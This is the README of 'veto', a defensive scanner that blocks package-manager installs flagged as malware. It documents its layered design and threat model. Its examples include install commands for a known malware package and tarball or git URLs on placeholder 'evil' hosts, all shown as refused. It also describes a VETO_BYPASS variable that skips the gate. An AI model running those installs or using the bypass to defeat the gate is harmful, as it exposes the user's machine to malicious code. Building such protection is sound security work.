# veto

A command-level malware scanner for package managers. Aggregates intel
from four upstream feeds (Aikido, OpenSSF malicious-packages, OSV,
PyPA advisory-db), deduplicates, and refuses to let an install proceed
if any source flags the requested package — at any version.

**Status:** ready for colleague use on macOS. Linux untested in this
revision; the C interposer should build but layer 4's mise/asdf
discovery paths haven't been verified on a Linux box.

## What it actually blocks

Tested end-to-end on a macOS / mise / homebrew dev machine against the
Aikido feed's `chai-as-upgraded` malware sample. All of these get
refused:

```sh
npm install chai-as-upgraded                                  # bare name
/opt/homebrew/bin/npm install chai-as-upgraded                # absolute path
~/.local/share/mise/installs/node/24.7.0/bin/npm install …    # mise install dir
npm install https://example.com/evil.tgz                      # opaque tarball URL
veto npm ci  # against a lockfile naming a flagged package # transitive coverage

# The canonical Python install form — caught via the python shim,
# which fast-paths every non-`-m {pm}` invocation back to real python:
python -m pip install chai-as-upgraded                        # refused
python3 -m uv pip install chai-as-upgraded                    # refused

# Fetch-and-run forms (npx-style):
npm exec chai-as-upgraded                                     # refused
uv tool install chai-as-upgraded                              # refused
uv run --with chai-as-upgraded python -c …                    # refused

# Python subprocess.run with absolute path AND stripped env — the case
# agents do constantly:
subprocess.run(["/opt/homebrew/bin/npm", "install", "chai-as-upgraded"],
               shell=False, env={"PATH": "/usr/bin:/bin"})       # also refused
```

The version on the lockfile or argv doesn't need to match the version
the upstream feed recorded — the gate refuses on package name.

## Quick install (60 seconds)

```sh
git clone https://github.com/brynbellomy/veto.git
cd veto
make install                                # builds → ~/.local/bin/veto
make interposer                             # builds libveto_interpose.dylib
veto sync                                # first-time intel fetch (~10s)

# Layer 2 — PATH shims (any agent shell)
veto install-shims

# Layer 1 — Claude Code Bash hook (if you use Claude Code)
veto install-claude-hook

# Layer 3 — native execve interposer (closes subprocess.run([abs_path]))
veto install-preload --lib $(pwd)/libveto_interpose.dylib --shell-rc auto

# Layer 4 — real-binary wrappers (the strongest layer; wraps homebrew/mise binaries)
veto install-wrappers

# Verify
veto doctor
```

Then `source ~/.zshrc` (or open a new terminal) for the interposer env
vars to take effect.

If `veto doctor` shows mise shadowing the Layer 2 shims, see
[mise PATH ordering](#mise-path-ordering) below.

## Defense layers

Four composing layers. Each catches a different class of agent
behavior. None is sufficient alone; together they cover the realistic
agent-bash threat surface.

| # | Layer | Catches | Install |
|---|---|---|---|
| 1 | Claude Code PreToolUse hook | Bash tool calls inside a Claude session, before the shell sees them | `veto install-claude-hook` |
| 2 | PATH shims (`~/.local/bin/{npm,pip,python,…}`) | bare-name PM invocations in any shell that inherits the user's PATH, including `python -m {pip,uv,pipx,poetry,pdm}` via the python shim | `veto install-shims` |
| 3 | Native execve interposer (`DYLD_INSERT_LIBRARIES` / `LD_PRELOAD`) | absolute-path invocations and `subprocess.run([abs])` in processes that inherit the preload env var | `veto install-preload --lib ./libveto_interpose.{dylib,so}` |
| 4 | Real-binary wrappers | absolute-path invocations even when env vars are stripped — the dylib doesn't need to load | `veto install-wrappers` |

Layer 4 is the strongest single layer because it requires no env-var
inheritance and no process cooperation — the bytes at
`/opt/homebrew/bin/npm` *are* veto. The tradeoff: `brew upgrade
node` or `mise install node@whatever` overwrites the wrapper. Re-run
`veto install-wrappers` after toolchain upgrades; `veto doctor`
flags drift.

## Why this design

Existing shell-function-based protection (e.g. Aikido `safe-chain`)
fails open in several real-world cases:

- the package manager is invoked through a wrapper that `execvp`'s the
  binary directly (`timeout npm install …`, `xargs … npm install …`,
  build systems, subprocess calls from Python/Go),
- the command runs in a non-interactive shell that didn't source the
  shim init script (CI, agent shells),
- the underlying tool's network behavior bypasses HTTPS-proxy
  enforcement (observed with `bun`'s package resolver — the motivating
  case for this project),
- the call uses an absolute path (`subprocess.run(["/opt/homebrew/bin/npm",
  …], shell=False)`) — agents do this constantly.

`veto` operates at the command layer: it parses argv, looks up
package names against an aggregated malware database, and refuses or
passes through. Because the check happens before the package manager
runs, none of the failure modes above apply.

## Architecture

```
intel/             ← parent: Source interface, MalwareReport, Store
intel/normalize.go ← PEP 503 + npm name normalization at lookup + ingest
intel/sources/
  aikido/          ← https://malware-list.aikido.dev (implemented)
  openssf/         ← github.com/ossf/malicious-packages (implemented)
  osv/             ← osv.dev MAL-* advisories (implemented)
  pypa/            ← github.com/pypa/advisory-database (PyPI; implemented)
  internal/fsutil/ ← shared atomic-write helper (source-internal)

packagemanager/    ← parent: PackageManager interface, Install
packagemanager/
  npm/ pnpm/ yarn/ bun/       ← jsspec-backed
  pip/ uv/ poetry/ pdm/       ← pyspec-backed
  exec/                       ← parameterized for npx/bunx/pnpx/uvx/pipx + npm exec
  jsspec/ pyspec/ argv/       ← shared spec parsers
  jsmanifest/ pymanifest/     ← package.json / pyproject.toml expanders
  jslock/ pylock/             ← lockfile expanders (transitive coverage)
  pyreq/                      ← requirements.txt expander
  pmlist/                     ← canonical PM-name set (single source of truth
                                consumed by isShimName, install-shims,
                                install-wrappers, the hook, AND the C
                                interposer via a generated pm_names.h)

gate/              ← decision logic (allow / refuse / passthrough / abort)
internal/hook/     ← Claude Code analyzer (Layer 1)
internal/interposer/  ← native execve/posix_spawn hooks in C (Layer 3)
  cmd/genpmlist/   ← go-generate tool that emits pm_names.h from pmlist
  gen/             ← hosts the //go:generate directive + drift consistency test
cmd/veto/          ← CLI entrypoint
hooks/             ← per-agent integration docs
```

**Lookup policy: name match wins.** Every source we ingest is
malware-only; the version field on a report is the version the source
sampled, not "only this version is bad." So a query for `(name, X.Y.Z)`
that finds any report for the same name — at any version — refuses.
This closes two real bypass paths: an attacker republishing the same
name under a new version, and a lockfile pinning a version the source
didn't sample.

**Transitive coverage via lockfiles.** When an install verb runs in a
project with a lockfile (`package-lock.json`, `pnpm-lock.yaml`,
`yarn.lock`, `uv.lock`, `poetry.lock`, `pdm.lock`), veto parses the
full resolved transitive tree and gates every (name, version) tuple in
it — not just the verb's explicit argv. This is the only way to catch
a flagged transitive dep that's been pinned into the lockfile without
running the resolver ourselves.

**Fail-closed defaults.** Per-source malware feeds are fetched
concurrently with etag-based caching in `~/.cache/veto/`.
On network outage the last good snapshot is used; if zero sources
succeed on the very first run, the veto refuses installs rather
than fail open. A sanity floor of 1000 reports total catches the
"every feed returned []" case loudly.

## Usage

```sh
# Gate an install (same shape as safe-chain's CLI).
veto npm install lodash         # → exec real npm
veto npm install chai-as-upgraded
# veto: install refused — malware intelligence flagged the following:
#   - chai-as-upgraded@<any> (ecosystem: npm)
#       [aikido] MALWARE

# Refresh malware intel manually.
veto sync

# Show source health and cache location.
veto status

# Verify all defense layers and intel state — run after any install.
veto doctor
```

`veto help` lists every subcommand grouped by layer.

### Environment

| Variable | Default | Purpose |
|---|---|---|
| `VETO_CACHE_DIR` | `$XDG_CACHE_HOME/veto` | where intel snapshots live |
| `VETO_SOURCES` | `aikido,openssf,osv,pypa` | comma-separated source IDs to enable |
| `VETO_LOG` | (info) | set `debug` for verbose logging |
| `VETO_BYPASS` | (unset) | prepend `VETO_BYPASS=1 ` to skip the gate for one invocation |
| `VETO_ALLOW_OPAQUE` | `0` | set `1` to opt URL/git/tarball installs through the gate (refused by default) |
| `VETO_PATH` | (set by install-preload) | consumed by the Layer 3 interposer |

### Refuse-opaque-by-default

`npm install https://evil.com/foo.tgz`, `pip install
git+https://evil.com/repo`, and `bun install user/repo` (npm's GitHub
shorthand) all bypass the package-registry name lookup — there's no
name to look up against. Veto's default policy refuses these
outright with a `[veto-policy]` source marker so they're
distinguishable from a malware-feed-driven block. Filesystem-path
specs (`./pkg`, `/abs/path`) still pass through — they don't pull
remote code on their own.

## mise PATH ordering

mise prepends its install dir(s) to PATH on `mise activate`. For
Layer 2 shims to win, `~/.local/bin` must come AFTER mise activate:

```sh
# ~/.zshrc
eval "$(mise activate zsh)"             # mise prepends ITS dirs
export PATH="$HOME/.local/bin:$PATH"    # then veto takes the front
```

If mise's `chpwd` hook re-prepends and undoes the reorder on every
`cd`, add this precmd to pin the order:

```sh
_veto_pin_path() { case ":$PATH:" in
  ":$HOME/.local/bin:"*) ;;
  *) PATH="$HOME/.local/bin:${PATH//$HOME\/.local\/bin:/}" ;;
esac }
precmd_functions+=(_veto_pin_path)
```

`veto doctor` detects mise (and asdf, pyenv, nvm) install dirs that
shadow Layer 2 shims and emits this recipe inline in the failure
output.

If you'd rather not touch PATH ordering at all, Layer 4
(`install-wrappers`) sidesteps the issue entirely: it wraps the actual
binaries at their install paths, so PATH lookup order stops mattering.

## Threat model and fail-closed semantics

**Fail-closed guarantees** (the gate refuses the install in all of
these):

- **Malicious package**: any source flags it → exit 1, "install
  refused — malware intelligence flagged …"
- **Opaque-spec install** (URL / git / tarball / `user/repo`
  github-shorthand): refused by default → exit 1,
  `[veto-policy]` source. Set `VETO_ALLOW_OPAQUE=1` to opt in
  after independently verifying the source.
- **Intel store cannot refresh** (every source failed, no cache):
  exit 70, "INTERNAL ERROR — intel refresh failed"
- **Intel store implausibly empty** (< 1000 reports total — aikido
  alone ships >120k): exit 70, "INTERNAL ERROR — intel store has
  only N reports"
- **Per-(source, ecosystem) drop below threshold**: a single feed's
  count cratering between refreshes (e.g. an MITM dropping Aikido's
  response, an upstream wedge) triggers per-bucket retention — the
  previous fetch's slice stays in the index instead of being silently
  replaced with a near-empty one. Threshold defaults to 50%; warn
  logs name the source.
- **Oversized intel payload**: any single feed body exceeding its
  per-source size cap (256 MiB for aikido/osv, 512 MiB for
  openssf/pypa) is rejected for that refresh — a compromised upstream
  cannot OOM veto by streaming a multi-GB body.
- **Manifest file present but unreadable / malformed** (`package.json`,
  `pyproject.toml`, `requirements.txt`, lockfiles): exit 70, "INTERNAL
  ERROR — install aborted fail-closed"
- **Claude Code hook crashes** (parser bug, malformed input): hook
  emits a "deny" with "INTERNAL ERROR in hook script"; if even that
  fails, exits 2 which Claude Code treats as a blocking error
- **Claude Code hook detects veto binary missing on PATH**: hook
  denies with a hard "DO NOT retry" message naming the mis-install
- **Layer 4 symlink identity check**: `install-wrappers` /
  `uninstall-wrappers` use strict physical-path identity (via
  `filepath.EvalSymlinks`) to decide "is this symlink ours" — an
  attacker-planted symlink whose target name merely contains "veto"
  is not accepted as a no-op, so `install-wrappers` will still
  overwrite it with the real veto wrapper.
- **Layer 4 `.veto-original` provenance**: a planted
  `<argv0>.veto-original` next to a veto shim is NOT trusted on its
  own — `findRealBinary` consults `wrappers.json` and refuses to exec
  a sibling whose parent path isn't a registered wrapper. A same-UID
  attacker dropping `~/.local/bin/npm.veto-original` cannot convert
  one tricked install into permanent gate-defeat.
- **Etag persistence**: each feed source writes the upstream etag
  ONLY after the body parses successfully. A transient malformed
  payload doesn't poison the cache — the next refresh re-downloads
  rather than 304-looping on a broken body.

**Known limitations** (what veto cannot protect against):

- **SIP-protected binaries on macOS** (`/usr/bin/pip3`,
  `/usr/bin/python3 -m pip …`). `DYLD_INSERT_LIBRARIES` is stripped
  by dyld for `/usr/bin/*` and `/System/...`; the dir is also
  read-only so Layer 4 wrappers can't be installed there. Out of
  veto's reach by design — it's a command-layer scanner, not a
  kernel-level interposer. Non-SIP python (mise, pyenv, homebrew) IS
  covered via the Layer 2 python shim — only the system interpreter
  at `/usr/bin/python3` is unreachable.
- **Linux `execl*` / `fexecve` / `execveat` coverage**: best-effort.
  H7 added LD_PRELOAD shadows for execl/execlp/execle/execvpe/
  fexecve/execveat, but glibc's internal `__execve` calls and
  statically-linked binaries bypass any libc-level interposer. Layers
  2 + 4 still catch these on Linux as long as PATH resolution flows
  through the shim or the real PM has been wrapped.
- **Toolchain upgrades wiping Layer 4 wrappers**. `brew upgrade node`
  re-installs the real npm binary on top of our symlink. `veto
  doctor` flags this; re-run `veto install-wrappers --force` after
  upgrades.
- **Compromised upstream returning near-empty feeds**. The 1000-report
  floor catches the worst case (literally empty), but a feed that
  omits most malware while still returning hundreds of entries would
  slip through. Track-and-alert on report-count drops is future work.
- **Statically-linked binaries that bypass libc**. Theoretical; no
  real PM does this today.

### Verifying your install

Run `veto doctor` in a fresh terminal. It checks:

- `veto` resolves on PATH and is executable.
- The shim directory is on PATH, and each PM shim wins the PATH
  lookup (no mise/homebrew binary shadowing it earlier). If a mise
  shadow is detected, the recipe to fix it appears inline in the
  output.
- The Claude Code Bash hook is wired in `~/.claude/settings.json`.
- The native interposer env vars are exported and the library file
  exists.
- Layer 4 wrappers — every recorded wrapper still points at veto
  and its `.veto-original` sibling is intact.
- The intel store is above the 1000-report sanity floor and was
  refreshed in the last 24 hours.

Each row is PASS / WARN / FAIL with a one-line fix. The command exits
1 if any row is FAIL — useful as a CI tripwire or a shell-rc check.

## License

TBD (planning open source once the design has settled).
